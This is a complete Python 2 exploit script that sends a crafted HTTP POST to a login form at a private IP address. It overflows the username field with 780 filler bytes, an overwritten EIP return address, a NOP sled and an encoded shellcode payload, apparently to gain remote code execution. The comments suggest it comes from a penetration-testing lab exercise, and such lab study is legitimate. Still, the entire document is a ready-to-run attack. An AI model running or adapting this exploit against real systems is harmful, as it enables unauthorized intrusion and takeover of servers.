#!/usr/bin/python
import socket
try:
    print "\nSending evil buffer..."

    shellcode =  ""
    shellcode += "\xda\xdd\xb8\xb8\xef\xd6\xe3\xd9\x74\x24\xf4\x5d"
    shellcode += "\x31\xc9\xb1\x52\x31\x45\x17\x83\xc5\x04\x03\xfd"
    shellcode += "\xfc\x34\x16\x01\xea\x3b\xd9\xf9\xeb\x5b\x53\x1c"
    shellcode += "\xda\x5b\x07\x55\x4d\x6c\x43\x3b\x62\x07\x01\xaf"
    shellcode += "\xf1\x65\x8e\xc0\xb2\xc0\xe8\xef\x43\x78\xc8\x6e"
    shellcode += "\xc0\x83\x1d\x50\xf9\x4b\x50\x91\x3e\xb1\x99\xc3"
    shellcode += "\x97\xbd\x0c\xf3\x9c\x88\x8c\x78\xee\x1d\x95\x9d"
    shellcode += "\xa7\x1c\xb4\x30\xb3\x46\x16\xb3\x10\xf3\x1f\xab"
    shellcode += "\x75\x3e\xe9\x40\x4d\xb4\xe8\x80\x9f\x35\x46\xed"
    shellcode += "\x2f\xc4\x96\x2a\x97\x37\xed\x42\xeb\xca\xf6\x91"
    shellcode += "\x91\x10\x72\x01\x31\xd2\x24\xed\xc3\x37\xb2\x66"
    shellcode += "\xcf\xfc\xb0\x20\xcc\x03\x14\x5b\xe8\x88\x9b\x8b"
    shellcode += "\x78\xca\xbf\x0f\x20\x88\xde\x16\x8c\x7f\xde\x48"
    shellcode += "\x6f\xdf\x7a\x03\x82\x34\xf7\x4e\xcb\xf9\x3a\x70"
    shellcode += "\x0b\x96\x4d\x03\x39\x39\xe6\x8b\x71\xb2\x20\x4c"
    shellcode += "\x75\xe9\x95\xc2\x88\x12\xe6\xcb\x4e\x46\xb6\x63"
    shellcode += "\x66\xe7\x5d\x73\x87\x32\xf1\x23\x27\xed\xb2\x93"
    shellcode += "\x87\x5d\x5b\xf9\x07\x81\x7b\x02\xc2\xaa\x16\xf9"
    shellcode += "\x85\x14\x4e\x76\xc4\xfd\x8d\x78\xf9\xa1\x18\x9e"
    shellcode += "\x93\x49\x4d\x09\x0c\xf3\xd4\xc1\xad\xfc\xc2\xac"
    shellcode += "\xee\x77\xe1\x51\xa0\x7f\x8c\x41\x55\x70\xdb\x3b"
    shellcode += "\xf0\x8f\xf1\x53\x9e\x02\x9e\xa3\xe9\x3e\x09\xf4"
    shellcode += "\xbe\xf1\x40\x90\x52\xab\xfa\x86\xae\x2d\xc4\x02"
    shellcode += "\x75\x8e\xcb\x8b\xf8\xaa\xef\x9b\xc4\x33\xb4\xcf"
    shellcode += "\x98\x65\x62\xb9\x5e\xdc\xc4\x13\x09\xb3\x8e\xf3"
    shellcode += "\xcc\xff\x10\x85\xd0\xd5\xe6\x69\x60\x80\xbe\x96"
    shellcode += "\x4d\x44\x37\xef\xb3\xf4\xb8\x3a\x70\x14\x5b\xee"
    shellcode += "\x8d\xbd\xc2\x7b\x2c\xa0\xf4\x56\x73\xdd\x76\x52"
    shellcode += "\x0c\x1a\x66\x17\x09\x66\x20\xc4\x63\xf7\xc5\xea"
    shellcode += "\xd0\xf8\xcf"

    filler = "A" * 780
    #EIP value is replaced with Return Address in Little Endian Format to lead execution flow into the Shellcode
    eip = "\x83\x0c\x09\x10"
    # offset is the byte space in the stack between EIP and ESP
    offset = "C" * 4
    #NOPs added to buffer to prevent the decoder stub from overwriting our shell code
    nops = "\x90" * 10

    # inputBuffer = filler + eip + offset + shellcode
    inputBuffer = filler + eip + offset + nops + shellcode

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.146.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.146.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.146.10", 80))
    s.send(buffer)

    s.close()
    
    print "\nDone!"

except:
    print "\nCould not connect!"

